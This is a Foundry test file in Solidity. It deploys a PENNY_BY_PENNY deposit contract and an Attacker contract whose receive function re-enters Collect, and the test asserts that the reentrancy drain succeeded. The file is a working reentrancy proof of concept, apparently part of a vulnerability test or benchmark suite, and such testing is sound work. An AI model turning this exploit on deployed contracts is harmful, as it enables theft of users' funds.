
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PENNY_BY_PENNY} from "../src/PENNY_BY_PENNY.sol";
import {LogFile} from "../src/PENNY_BY_PENNY.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {
    PENNY_BY_PENNY public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PENNY_BY_PENNY();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max / 4);
        
        vm.deal(address(_contractUnderTest), attackVal * 4);
        vm.deal(address(_attacker), attackVal * 4);
        vm.deal(address(this), attackVal * 4);
        
        vm.prank(address(_attacker));
        _contractUnderTest.Put{value: attackVal * 2}(0);
        
        vm.warp(block.timestamp + 1 days);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;
    
    constructor(address victimAddress) { 
        victim = PENNY_BY_PENNY(victimAddress);
    }
    
    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
    }
    
    function attack(uint256 val) public {
        initialSnapshot = address(victim).balance;
        
        victim.Collect(storedAttackVal);
        
        uint256 finalAttackerBalanceInVictim = victim.Acc(address(this)).balance;
        uint256 finalVictimBalance = address(victim).balance;
        
        if (finalAttackerBalanceInVictim == 0 && finalVictimBalance == initialSnapshot - 2 * storedAttackVal) {
            exploitSucceeded = true;
        }
    }
    
    receive() external payable {
        if (attackCallCount < 2) {
            victim.Collect(storedAttackVal);
            attackCallCount++;
        }
    }
}
